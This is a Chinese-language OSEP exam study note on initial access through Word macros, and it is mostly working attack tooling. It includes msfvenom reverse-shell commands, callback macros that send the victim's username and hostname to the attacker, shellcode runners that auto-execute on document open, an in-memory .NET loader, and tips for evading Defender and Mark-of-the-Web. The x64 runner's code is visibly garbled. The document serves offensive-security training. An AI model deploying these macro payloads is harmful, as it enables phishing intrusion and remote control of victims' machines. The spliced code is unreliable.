::: warning 仅限授权使用
本笔记仅用于 OSEP 官方实验 / 考试环境，或已获得书面授权的测试。禁止对未授权系统使用。
:::

# 模块 M01：Word / VBA 宏入口与载荷形态

> **覆盖场景：**1、2、3、4、5
>
> **教材依据：**第 4 章（宏与初始访问）、第 10 章（进程迁移与生命周期）、第 11 章（免杀与编码）
>
> **前置依赖：**可投递的 `.docm`/`.doc`；目标安装 Office；攻击机有 HTTP 投递服务（`m00-delivery-server.py`）；x86/x64 两套 Runner 已编译

**本模块的共同原则**：
1. **先探测，再投递**——Office 位数未知时，任何直接投递 Runner 的行为都是赌博。
2. **宏里做的事越少越稳**——第一阶段的唯一职责是"触发 + 取回下一步"。
3. **失败时先分清是"宏没跑"还是"宏跑了但下一步被拦"**——两者的修法完全不同。

---

## 场景 1：网站接受 Word 文件并自动打开；目标有杀毒软件，Office 位数未知

**场景回顾**：招聘网站允许上传 `.docm`，后台用户会打开且宏能触发；目标装了 Defender，但**不知道 Office 是 32 位还是 64 位**，直接用公开宏样例既可能被查杀，也可能因位数不匹配崩溃。

**前提与假设**：
- 已有一个可上传文档的入口，且能观察到"文档被打开"（回调到达）。
- 目标宏安全设置允许执行（或用户会点"启用内容"）。
- 攻击机 HTTP 投递服务已就绪，日志可看。

**准备（攻击机侧）**：

1. 起投递服务并盯日志：
   ```bash
   python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads
   ```
2. 准备三份材料（全部事先验证过）：
   | 材料 | 文件 | 作用 |
   |---|---|---|
   | 无害回调宏 | `m01-callback-ping.vba` | 只证明宏触发与出网 |
   | 架构识别宏 | `m01-detect-arch.vba` | 回传 Office 位数 |
   | Runner | `m01-shellcode-runner-vba-x86.vba` / `-x64.vba` | 按位数选择 |
3. 生成两套 shellcode（x86/x64 分开）：
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f c -o sc-x64.c
   msfvenom -p windows/shell_reverse_tcp   LHOST=LHOST LPORT=LPORT -f c -o sc-x86.c
   ```
4. 起监听：`bash m00-listener.sh 4444`

**执行步骤**：

1. 把 `m01-callback-ping.vba` 粘进 Word 的 `ThisDocument`，另存为 `.docm`，上传。
2. 观察投递日志：出现 `GET /worked` → 宏确实执行且能出网。
3. 换 `m01-detect-arch.vba` 上传，等待回传（日志里会带 `64-bit: True/False`）。
4. 按回传结果把对应位数的 Runner 内嵌到宏里（**不要同时嵌两套**，体积和特征都翻倍），上传。
5. 监听端确认回连，立即执行：
   ```cmd
   whoami /priv
   systeminfo | findstr /B /C:"OS Name" /C:"System Type"
   ```

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m01-callback-ping.vba` | 无害回调，验证宏与出网 | 替换 `LHOST` |
| `m01-detect-arch.vba` | WMI 判断 Office 位数并回传 | 替换 `LHOST` |
| `m01-shellcode-runner-vba-x86.vba` | 32 位 Runner | 替换 shellcode 数组 |
| `m01-shellcode-runner-vba-x64.vba` | 64 位 Runner | 替换 shellcode 数组 |
| `m01-shellcode-runner-vba-archbranch.vba` | 自动判断位数并分支 | 同时内嵌两套 shellcode |

#### `m00-delivery-server.py` {#m00-delivery-server-py}

````python
#!/usr/bin/env python3
"""用途：投递服务器——HTTP/HTTPS 双通道，记录每个请求的来源、User-Agent、路径，用于确认"目标是否真的下载了"

场景：通用基础设施（配合 docs/00-environment-and-infra.md；支撑场景 3、8、15、16、17、28、30、31 的投递与排错）

依赖：Python 3.7+（标准库）；HTTPS 需要 cert/key（可用 openssl 或 m00-build-payloads.sh 生成）

使用：
    # HTTP（默认 80）
    python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads

    # HTTPS（自签）
    python3 m00-delivery-server.py --port 443 --dir ~/osep/payloads \
        --cert ~/osep/tools/cert.pem --key ~/osep/tools/key.pem

    # 只做探测模式：不返回文件，只记录请求（确认目标出网路径）
    python3 m00-delivery-server.py --port 8000 --probe-only

占位符：LHOST=攻击机 IP（脚本会打印可用 URL）；PAYLOAD=放在 --dir 下的载荷文件名

测试状态：已在 macOS 本机用 Python 3 语法校验（py_compile）；HTTP 模式可直接运行验证
"""
from __future__ import annotations

import argparse
import datetime
import http.server
import os
import socket
import ssl
import sys
import threading

class LoggedHandler(http.server.SimpleHTTPRequestHandler):
    """带结构化日志的静态文件服务；probe-only 模式只记录不返回文件。"""

    probe_only = False
    log_path = "delivery.log"
    server_version = "DeliveryServer/1.0"
    _lock = threading.Lock()

    def _client(self) -> str:
        return f"{self.client_address[0]}:{self.client_address[1]}"

    def _record(self, method: str, status: int, note: str = "") -> None:
        stamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ua = self.headers.get("User-Agent", "-")
        host = self.headers.get("Host", "-")
        line = f"{stamp}\t{self._client()}\t{method}\t{self.path}\t{status}\t{host}\t{ua}\t{note}"
        with self._lock:
            with open(self.log_path, "a", encoding="utf-8") as fh:
                fh.write(line + "\n")
        print(line, flush=True)

    def do_GET(self):  # noqa: N802
        if self.probe_only:
            self._record("GET", 200, "probe-only")
            body = b"ok\n"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        self._record("GET", 200)
        super().do_GET()

    def do_POST(self):  # noqa: N802
        length = int(self.headers.get("Content-Length", 0) or 0)
        data = self.rfile.read(length) if length else b""
        self._record("POST", 200, f"body={data[:200]!r}")
        body = b"ok\n"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_HEAD(self):  # noqa: N802
        self._record("HEAD", 200)
        super().do_HEAD()

    def log_message(self, fmt, *args):  # 抑制默认 stderr 输出，统一走 _record
        return

def local_ips() -> list[str]:
    ips = set()
    try:
        hostname = socket.gethostname()
        for info in socket.getaddrinfo(hostname, None, socket.AF_INET):
            ips.add(info[4][0])
    except Exception:
        pass
    # 兜底：探测默认路由出口地址
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ips.add(s.getsockname()[0])
        s.close()
    except Exception:
        pass
    return sorted(ip for ip in ips if not ip.startswith("127."))

def main() -> int:
    ap = argparse.ArgumentParser(description="OSEP 投递服务器（HTTP/HTTPS + 请求日志）")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--dir", default=os.path.expanduser("~/osep/payloads"))
    ap.add_argument("--cert", default="")
    ap.add_argument("--key", default="")
    ap.add_argument("--log", default="", help="日志路径，默认 <dir>/../logs/delivery.log")
    ap.add_argument("--probe-only", action="store_true", help="只记录请求，不返回文件")
    args = ap.parse_args()

    root = os.path.abspath(os.path.expanduser(args.dir))
    if not os.path.isdir(root):
        os.makedirs(root, exist_ok=True)
    log_path = args.log or os.path.join(os.path.dirname(root), "logs", "delivery.log")
    os.makedirs(os.path.dirname(log_path), exist_ok=True)

    LoggedHandler.probe_only = args.probe_only
    LoggedHandler.log_path = log_path

    handler = lambda *a, **kw: LoggedHandler(*a, directory=root, **kw)  # noqa: E731
    httpd = http.server.ThreadingHTTPServer((args.bind, args.port), handler)

    scheme = "http"
    if args.cert and args.key:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(certfile=os.path.expanduser(args.cert), keyfile=os.path.expanduser(args.key))
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
        scheme = "https"

    print(f"[*] 投递根目录: {root}")
    print(f"[*] 请求日志:   {log_path}")
    print(f"[*] 模式:       {'probe-only（只记录）' if args.probe_only else '文件投递'}")
    print("[*] 可用地址:")
    for ip in local_ips():
        print(f"      {scheme}://{ip}:{args.port}/PAYLOAD")
    print("[*] Ctrl+C 停止")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] 已停止")
    finally:
        httpd.server_close()
    return 0

if __name__ == "__main__":
    sys.exit(main())
````

#### `m01-callback-ping.vba` {#m01-callback-ping-vba}

````vb
' Purpose: Harmless callback macro. Confirms the macro actually ran after the
'          victim opens the .docm, BEFORE any malicious payload is delivered.
' Scenario: M01 - Scenario 1 (website accepts .docm, macro triggers, bitness unknown)
' Reference: cheat sheet "Microsoft Word -> Callback Pinging"
' Dependencies: No payload needed. HTTP server on the Kali side only
'          (see m01-http-file-server.md).
' Usage:
'   1. Start a listener that records HTTP hits, e.g. on Kali:
'        sudo python3 m01-serve.py /var/www/html 80    (or nginx, see infra doc)
'   2. Replace SERVER_URL below with: http://LHOST/m01/callback
'   3. Paste this module into the .docm VBA project (Alt+F11 -> Insert -> Module)
'      and save the document as .docm (Macro-Enabled Document).
' Placeholders: LHOST=<attacker IP reachable from the target>
' Test status: VBA cannot be executed on macOS; XMLHTTP logic verified on
'          Windows PowerShell/IE COM only by hand review. Verify in the lab
'          that the GET shows up in the HTTP server log before delivering real
'          payloads.
Option Explicit

' ===================================================================
' CONFIGURATION
' ===================================================================
' Attacker callback endpoint. Keep it a unique path so the HTTP log makes
' it obvious this document fired (e.g. /m01/callback?u=<user>&t=<epoch>).
Private Const SERVER_URL As String = "http://LHOST/m01/callback"

' -------------------------------------------------------------------
' In-process HTTP GET helper. No child process is spawned, so this also
' works when Office is configured to block PowerShell/cmd child
' processes (Scenario 2 hardening) and avoids the 32-bit-on-64-bit
' System32/SysWOW64 curl.exe lookup problem entirely.
' -------------------------------------------------------------------
Private Function HttpGet(ByVal url As String) As Boolean
    On Error GoTo fail
    Dim http As Object
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False   ' synchronous: macro waits for the request
    http.setRequestHeader "User-Agent", "Mozilla/5.0"  ' blend in with normal traffic
    http.Send
    HttpGet = (http.Status >= 200 And http.Status < 300)
    Set http = Nothing
    Exit Function
fail:
    HttpGet = False
End Function

' -------------------------------------------------------------------
' Callback body: name/process/host info as URL query parameters.
' URL-encode only the characters that can legally break a URL here.
' -------------------------------------------------------------------
Private Function UrlEncode(ByVal s As String) As String
    s = Replace(s, "%", "%25")
    s = Replace(s, " ", "%20")
    s = Replace(s, "&", "%26")
    s = Replace(s, "?", "%3F")
    s = Replace(s, "=", "%3D")
    s = Replace(s, "+", "%2B")
    UrlEncode = s
End Function

Private Sub DoCallback()
    Dim userName As String, hostName As String, tick As String
    Dim fullUrl As String

    ' Collect context WITHOUT relying on WMI or child processes
    On Error Resume Next
    userName = Environ("USERNAME")
    hostName = Environ("COMPUTERNAME")
    On Error GoTo 0

    ' Epoch-ish timestamp to defeat HTTP caching and to see repeat opens
    tick = CStr(CLng(Timer) Mod 100000000)
    fullUrl = SERVER_URL & "?u=" & UrlEncode(userName) & "&h=" & UrlEncode(hostName) & "&t=" & tick

    Dim ok As Boolean
    ok = HttpGet(fullUrl)

    ' Fallback channel #1 (commented by default): classic curl child process.
    ' Only enable when the in-process request is blocked and you accept that
    ' Office may forbid spawning processes on this target.
    ' If Not ok Then
    '     Dim cmd As String
    '     cmd = "cmd.exe /c curl.exe -s -o NUL """ & fullUrl & """"
    '     Shell cmd, vbHide
    ' End If
End Sub

Private Sub RunOnce()
    ' AutoOpen AND Document_Open both fire when Word opens the file, which
    ' would double the callback. Fire the body only once per session.
    Static fired As Boolean
    If Not fired Then
        fired = True
        DoCallback
    End If
End Sub

' Word 2003+ named entry points - keep both, Word may call either one first.
Public Sub AutoOpen()
    RunOnce
End Sub

Public Sub Document_Open()
    RunOnce
End Sub
````

#### `m01-detect-arch.vba` {#m01-detect-arch-vba}

````vb
' 用途：识别 Office 宿主位数并回传（投递 payload 前必须先做这一步）
' 场景：1（Office 位数未知时先探测）
' 依赖：Office + WMI（winmgmts）；攻击机需运行监听/HTTP 日志
' 使用：粘进 ThisDocument（或标准模块），另存为 .docm 后投递；攻击机先 `nc -nvlp 80`
' 占位符：LHOST=攻击机 IP（替换下方 SERVER_URL）
' 测试状态：未在 Windows 实测；已人工核对 VBA 语法与 WMI 查询
Option Explicit

Private Const SERVER_URL As String = "http://LHOST:80/arch"   ' ← 替换 LHOST

Private Sub SendProcessInfo()
    Dim wmiService As Object, processList As Object, processItem As Object
    Dim result As String, is64Bit As Boolean
    Dim procName As String

    procName = "winword.exe"          ' 若通过 Excel 投递改成 excel.exe
    On Error Resume Next
    Set wmiService = GetObject("winmgmts:\\.\root\CIMV2")
    Set processList = wmiService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & procName & "'")

    If processList.Count > 0 Then
        For Each processItem In processList
            ' 32 位 Office 的路径会落在 Program Files (x86)
            is64Bit = (InStr(1, processItem.CommandLine, "Program Files (x86)", vbTextCompare) = 0)
            result = "proc=" & procName & "&x64=" & CStr(is64Bit) & "&user=" & Environ("USERNAME")
        Next
    Else
        result = "proc=" & procName & "&x64=unknown&user=" & Environ("USERNAME")
    End If

    ' 编译期位数（VBA 自身所在进程的位数，最可靠）
    #If Win64 Then
        result = result & "&vba_x64=True"
    #Else
        result = result & "&vba_x64=False"
    #End If

    If Err.Number <> 0 Then
        result = result & "&err=" & Err.Number
    End If
    On Error GoTo 0

    ' 回传（curl 在 Win10+ 自带；旧系统可换 nslookup）
    Shell "cmd.exe /c curl -s -X POST -d """ & result & """ " & SERVER_URL, vbHide
End Sub

Sub AutoOpen()
    SendProcessInfo
End Sub

Sub Document_Open()
    SendProcessInfo
End Sub
````

#### `m01-shellcode-runner-vba-x86.vba` {#m01-shellcode-runner-vba-x86-vba}

````vb
' 用途：x86（32 位）Office 下的进程内 shellcode Runner
' 场景：2、1（位数确认为 32 位后使用）
' 依赖：32 位 Office；x86 shellcode（msfvenom -p windows/shell_reverse_tcp -f c）
' 使用：替换 SHELLCODE 与 XOR_KEY，粘进 ThisDocument 后另存为 .docm
' 占位符：SHELLCODE（x86 字节数组）、XOR_KEY（与编码时一致）
' 测试状态：未在 Windows 实测；已人工核对声明与语法
Option Explicit

#If Not Win64 Then      ' 只在 32 位 Office 中编译

Private Const XOR_KEY As Byte = &H2A

Private Declare Function VirtualAlloc Lib "kernel32" ( _
    ByVal lpAddress As Long, ByVal dwSize As Long, _
    ByVal flAllocationType As Long, ByVal flProtect As Long) As Long

Private Declare Function CreateThread Lib "kernel32" ( _
    ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, _
    ByVal lpStartAddress As Long, ByVal lpParameter As Long, _
    ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long

Private Declare Sub RtlMoveMemory Lib "kernel32" ( _
    ByVal Destination As Long, ByRef Source As Any, ByVal Length As Long)

Private Declare Function WaitForSingleObject Lib "kernel32" ( _
    ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long

Sub RunShellcode()
    Dim sc() As Byte, i As Long
    Dim mem As Long, hThread As Long

    sc = GetEncodedShellcode()
    For i = LBound(sc) To UBound(sc)
        sc(i) = sc(i) Xor XOR_KEY
    Next i

    mem = VirtualAlloc(0, UBound(sc) + 1, &H3000, &H40)
    If mem = 0 Then Exit Sub
    RtlMoveMemory mem, sc(0), UBound(sc) + 1

    hThread = CreateThread(0, 0, mem, 0, 0, 0)
    If hThread = 0 Then Exit Sub
    WaitForSingleObject hThread, 1000
End Sub

Private Function GetEncodedShellcode() As Byte()
    ' ← 用 m13-xor-encoder.py --format vba 生成后替换
    Dim tmp(3) As Byte
    tmp(0) = &H1B: tmp(1) = &H1B: tmp(2) = &H1B: tmp(3) = &H1B
    GetEncodedShellcode = tmp
End Function

Sub AutoOpen()
    RunShellcode
End Sub

Sub Document_Open()
    RunShellcode
End Sub

#End If
````

#### `m01-shellcode-runner-vba-x64.vba` {#m01-shellcode-runner-vba-x64-vba}

````vb
' 用途：x64 Office 下的进程内 shellcode Runner（不创建 PowerShell/子进程）
' 场景：2（Office 禁止启动 PowerShell 时的替代路线）、1（位数确认后的 x64 分支）
' 依赖：64 位 Office；x64 shellcode（msfvenom -p windows/x64/... -f c）
' 使用：把 SHELLCODE 数组替换为你的 x64 shellcode（可先 XOR 编码），粘进 ThisDocument 后另存为 .docm
' 占位符：LHOST/LPORT 由 shellcode 生成时决定；本脚本内需替换 SHELLCODE 与 XOR_KEY
' 测试状态：未在 Windows 实测；已人工核对 PtrSafe 声明与语法
Option Explicit

#If Win64 Then          ' 只在 64 位 Office 中编译本模块，避免位数不匹配崩溃

Private Const XOR_KEY As Byte = &H2A   ' ← 与生成 shellcode 时用的 key 一致

Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
    ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, _
    ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
    ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, _
    ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, _
    ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr

Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" ( _
    ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As LongPtr)

Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" ( _
    ByVal hHandle As LongPtr, ByVal dwMilliseconds As Long) As Long

Sub RunSheng
    Dim mem As LongPtr
    Dim hThread As LongPtr

    ' ① 把你的 x64 shellcode（XOR 编码后的字节）填在这里llcode()
    Dim sc() As Byte
    Dim i As Lo
    sc = GetEncodedShellcode()

    ' ② 内存中解密
    For i = LBound(sc) To UBound(sc)
        sc(i) = sc(i) Xor XOR_KEY
    Next i

    ' ③ 分配可读写内存 → 复制 → 改为可执行
    mem = VirtualAlloc(0, UBound(sc) + 1, &H3000, &H40)   ' MEM_COMMIT|RESERVE, PAGE_EXECUTE_READWRITE
    If mem = 0 Then
        MsgBox "VirtualAlloc 失败（可能被 ASR 拦截）"
        Exit Sub
    End If
    RtlMoveMemory mem, sc(0), UBound(sc) + 1

    ' ④ 在 WINWORD.EXE 进程内创建线程执行
    hThread = CreateThread(0, 0, mem, 0, 0, 0)
    If hThread = 0 Then
        MsgBox "CreateThread 失败"
        Exit Sub
    End If
    WaitForSingleObject hThread, 1000
End Sub

Private Function GetEncodedShellcode() As Byte()
    ' ← 用 m13-xor-encoder.py --format vba 生成后替换本函数
    ' 示例（占位）：
    Dim tmp(3) As Byte
    tmp(0) = &H1B: tmp(1) = &H1B: tmp(2) = &H1B: tmp(3) = &H1B
    GetEncodedShellcode = tmp
End Function

Sub AutoOpen()
    RunShellcode
End Sub

Sub Document_Open()
    RunShellcode
End Sub

#End If
````

#### `m00-listener.sh` {#m00-listener-sh}

````bash
#!/usr/bin/env bash
# 用途：标准监听器——带 readline、会话落盘、端口占用检查、可选自动起 HTTP 投递
# 场景：通用基础设施（每个反向 shell / C2 会话都用它，支撑 docs/00 与全部模块）
# 依赖：ncat 或 nc、rlwrap（可选）、lsof
# 使用：bash m00-listener.sh 4444 [LOGDIR] [--http]
#       示例：bash m00-listener.sh 4444 ~/osep/logs --http
# 占位符：LPORT=监听端口（第 1 个参数）、LOGDIR=日志目录（第 2 个参数，默认 ~/osep/logs）
# 测试状态：已做 bash -n 语法校验（本机 macOS 无 ncat，未实测监听）
set -euo pipefail

LPORT="${1:-}"
LOGDIR="${2:-$HOME/osep/logs}"
WITH_HTTP=0
[[ "${3:-}" == "--http" || "${2:-}" == "--http" ]] && WITH_HTTP=1

if [[ -z "$LPORT" ]]; then
  echo "用法: bash $0 LPORT [LOGDIR] [--http]" >&2
  exit 1
fi

mkdir -p "$LOGDIR"
LOGFILE="$LOGDIR/shell-$LPORT.log"

# --- 端口占用检查 ---
if command -v lsof >/dev/null 2>&1 && lsof -nP -iTCP:"$LPORT" -sTCP:LISTEN >/dev/null 2>&1; then
  echo "[!] 端口 $LPORT 已被占用：" >&2
  lsof -nP -iTCP:"$LPORT" -sTCP:LISTEN >&2
  echo "[!] 换端口或先结束占用进程。" >&2
  exit 1
fi

# --- 可选：同时起 HTTP 投递 ---
if [[ "$WITH_HTTP" -eq 1 ]]; then
  if [[ -d "$HOME/osep/payloads" ]]; then
    echo "[*] 启动 HTTP 投递（80 端口），日志：$LOGDIR/http-80.log"
    (cd "$HOME/osep/payloads" && python3 -m http.server 80 >"$LOGDIR/http-80.log" 2>&1 &) || \
      echo "[!] HTTP 投递启动失败（端口可能被占用），可单独启动"
  else
    echo "[!] 未找到 $HOME/osep/payloads，跳过 HTTP 投递"
  fi
fi

# --- 选择监听器 ---
echo "[*] 监听 0.0.0.0:$LPORT，日志：$LOGFILE"
echo "[*] 提示：拿到会话先跑 whoami /priv、systeminfo、出网探测（见 m00-recon-defenses.ps1）"

if command -v rlwrap >/dev/null 2>&1 && command -v ncat >/dev/null 2>&1; then
  rlwrap -cAr ncat -lvnp "$LPORT" --keep-open 2>&1 | tee -a "$LOGFILE"
elif command -v rlwrap >/dev/null 2>&1; then
  rlwrap -cAr nc -lvnp "$LPORT" 2>&1 | tee -a "$LOGFILE"
elif command -v ncat >/dev/null 2>&1; then
  ncat -lvnp "$LPORT" --keep-open 2>&1 | tee -a "$LOGFILE"
else
  echo "[!] 未找到 rlwrap/ncat/nc，请先安装：sudo apt install -y ncat rlwrap" >&2
  exit 1
fi
````

#### `m01-shellcode-runner-vba-archbranch.vba` {#m01-shellcode-runner-vba-archbranch-vba}

````vb
' 用途：用 VBA 编译期常量自动匹配 Office 位数，避免投递位数不匹配的 Runner 导致宿主崩溃
' 场景：1（位数未知时的"一把梭"版本）
' 依赖：Office；x64 与 x86 两套 shellcode（各自 XOR 编码）
' 使用：把两段 shellcode 分别填进 GetX64Shellcode / GetX86Shellcode，粘进 ThisDocument 后另存为 .docm
' 占位符：SHELLCODE_X64、SHELLCODE_X86（字节数组）、XOR_KEY
' 测试状态：未在 Windows 实测；已人工核对 #If Win64 编译期分支写法
'
' 说明：VBA 的 #If Win64 是**编译期**常量，Office 加载宏时就知道自己是 32 还是 64 位，
'       因此同一个 .docm 可以在两种 Office 上都能跑对分支——比运行时 WMI 探测更可靠。
Option Explicit

Private Const XOR_KEY As Byte = &H2A

#If VBA7 Then
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
        ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, _
        ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
        ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, _
        ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, _
        ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
    Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" ( _
        ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As LongPtr)
    Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" ( _
        ByVal hHandle As LongPtr, ByVal dwMilliseconds As Long) As Long
#Else
    Private Declare Function VirtualAlloc Lib "kernel32" ( _
        ByVal lpAddress As Long, ByVal dwSize As Long, _
        ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function CreateThread Lib "kernel32" ( _
        ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, _
        ByVal lpStartAddress As Long, ByVal lpParameter As Long, _
        ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long
    Private Declare Sub RtlMoveMemory Lib "kernel32" ( _
        ByVal Destination As Long, ByRef Source As Any, ByVal Length As Long)
    Private Declare Function WaitForSingleObject Lib "kernel32" ( _
        ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
#End If

Sub RunShellcode()
    Dim sc() As Byte, i As Long

    #If Win64 Then
        sc = GetX64Shellcode()      ' 64 位 Office → x64 shellcode
    #Else
        sc = GetX86Shellcode()      ' 32 位 Office → x86 shellcode
    #End If

    For i = LBound(sc) To UBound(sc)
        sc(i) = sc(i) Xor XOR_KEY
    Next i

    Dim mem As LongPtr, hThread As LongPtr
    mem = VirtualAlloc(0, UBound(sc) + 1, &H3000, &H40)
    If mem = 0 Then Exit Sub
    RtlMoveMemory mem, sc(0), UBound(sc) + 1

    hThread = CreateThread(0, 0, mem, 0, 0, 0)
    If hThread = 0 Then Exit Sub
    WaitForSingleObject hThread, 1000
End Sub

Private Function GetX64Shellcode() As Byte()
    Dim tmp(3) As Byte
    tmp(0) = &H1B: tmp(1) = &H1B: tmp(2) = &H1B: tmp(3) = &H1B
    GetX64Shellcode = tmp
End Function

Private Function GetX86Shellcode() As Byte()
    Dim tmp(3) As Byte
    tmp(0) = &H1B: tmp(1) = &H1B: tmp(2) = &H1B: tmp(3) = &H1B
    GetX86Shellcode = tmp
End Function

Sub AutoOpen()
    RunShellcode
End Sub

Sub Document_Open()
    RunShellcode
End Sub
````

**验证**：
- 投递日志出现请求（证明文档被打开）
- 回调日志出现 `worked` 或位数回传（证明宏执行 + 出网）
- 监听端出现会话（证明 Runner 生效）

**失败分支与备选**：
1. **投递日志没有任何请求** → 文档没被打开，或宏被安全设置拦。检查是否被 Mark-of-the-Web 拦（压缩包投递、SMB 共享打开可绕过 MotW）；或换 `.doc` 旧格式、换 `.xlsm`。
2. **有请求但没有回调** → 宏执行了但出网被拦。改用内嵌第二阶段（场景 17）或换 HTTP→SMB 投递路径。
3. **位数识别失败**（WMI 被拦） → 改用环境变量多路探测（`ProgramFiles(x86)` 存在性）或直接投 `archbranch` 版本。
4. **宏本身被 Defender 拦** → 见场景 18：拆分字符串、去公共模板特征，或改用 HTA/JScript 入口（M02/M03）。

**考试注意 / OPSEC**：宏被拦时不要反复上传同一文件；每次改动记录"改了什么、结果如何"。位数探测要**先于** payload 投递，否则你会在位数不匹配上浪费大量时间。

---

## 场景 2：Word 会自动打开，但 Office 启动 PowerShell 被阻止

**场景回顾**：宏能运行，但宏一启动 `powershell.exe` 就失败——目标可能限制 Office 创建子进程，或对该进程链做检测。

**前提与假设**：
- 场景 1 的回调宏已验证宏能执行。
- `Shell "powershell ..."` / `WScript.Shell.Run` 被拦或被杀软终止。

**准备（攻击机侧）**：准备**不创建子进程**的两条 VBA 路线
1. **纯 VBA + Win32 API 执行 shellcode**：`VirtualAlloc` → `RtlMoveMemory` → `CreateThread`，全程在 `WINWORD.EXE` 进程内。
2. **VBA 调 .NET**：通过 `GetObject("new:...")` / COM 或 `CreateObject` 加载托管程序集（部分环境需 `mscoree`）。

```text
编译/准备：m01-shellcode-runner-vba-x64.vba（含 PtrSafe 声明与位数分支）
备用：m01-embedded-dotnet-runner.vba（VBA 内加载 .NET 程序集）
```

**执行步骤**：

1. 用回调宏确认宏仍可执行（排除"宏被整体拦"）。
2. 投递纯 VBA Runner：宏内不出现 `powershell`、`cmd`、`wscript` 等字符串。
3. 监听端确认回连；同时确认**没有**新的 `powershell.exe` 进程：
   ```cmd
   tasklist | findstr /I "powershell cmd wscript cscript"
   ```
4. 若回连成功但会话脆弱（Word 一关就断）→ 直接转场景 5。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m01-shellcode-runner-vba-x64.vba` | 进程内执行，不创建子进程 | shellcode 数组 |
| `m01-embedded-dotnet-runner.vba` | VBA 内加载 .NET 程序集 | 程序集 Base64 |
| `m01-callback-ping.vba` | 排除"宏整体被拦" | LHOST |

#### `m01-embedded-dotnet-runner.vba` {#m01-embedded-dotnet-runner-vba}

````vb
' 用途：VBA 内直接加载并执行 .NET 程序集（不依赖下载、不启动 PowerShell 子进程）
' 场景：2、17（Office 禁止子进程；目标无稳定出网）
' 依赖：Office + .NET Framework（mscoree）；预编译的托管程序集（Base64 内嵌）
' 使用：把程序集 Base64 填进 ASSEMBLY_B64，粘进 ThisDocument 后另存为 .docm
' 占位符：ASSEMBLY_B64（.NET 程序集 Base64）、ENTRY_TYPE、ENTRY_METHOD
' 测试状态：未在 Windows 实测；已人工核对 COM/反射调用写法
'
' 说明：通过 mscoree 的 CorBindToRuntimeEx 加载 CLR，再用反射调用程序集入口。
'       程序集建议用 csc.exe 编译成 Library，入口写成 public static void Run()。
Option Explicit

Private Const ASSEMBLY_B64 As String = "REPLACE_WITH_BASE64_ASSEMBLY"
Private Const ENTRY_TYPE As String = "Payload.Runner"
Private Const ENTRY_METHOD As String = "Run"

Private Sub LoadManaged()
    Dim clr As Object, appDomain As Object, asm As Object
    Dim bytes() As Byte, entryType As Object, mi As Object

    On Error Resume Next
    ' ① 取 CLR（.NET 4.0）
    Set clr = CreateObject("Clr4.mscoree")          ' 部分环境用 "mscoree.dll" 的 COM 包装
    If clr Is Nothing Then
        ' 备选：通过 VBScript 风格 GetObject 触发 CLR 宿主
        Set clr = GetObject("new:{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}")   ' CorRuntimeHost
    End If

    ' ② 建立 AppDomain 并加载程序集字节（内存加载，不落地）
    bytes = Base64Decode(ASSEMBLY_B64)
    Set appDomain = clr.GetDefaultDomain()
    Set asm = appDomain.Load(bytes)

    ' ③ 反射调用入口
    Set entryType = asm.GetType(ENTRY_TYPE)
    If Not entryType Is Nothing Then
        Set mi = entryType.GetMethod(ENTRY_METHOD)
        If Not mi Is Nothing Then mi.Invoke Null, Array()
    End If
    On Error GoTo 0
End Sub

' 极简 Base64 解码（避免依赖外部组件）
Private Function Base64Decode(ByVal s As String) As Byte()
    Dim xml As Object, node As Object
    Set xml = CreateObject("MSXML2.DOMDocument")
    Set node = xml.createElement("b")
    node.dataType = "bin.base64"
    node.Text = s
    Base64Decode = node.nodeTypedValue
End Function

Sub AutoOpen()
    LoadManaged
End Sub

Sub Document_Open()
    LoadManaged
End Sub
````

**验证**：`tasklist` 中无 Office 子进程但监听端有会话；`whoami` 返回预期用户。

**失败分支与备选**：
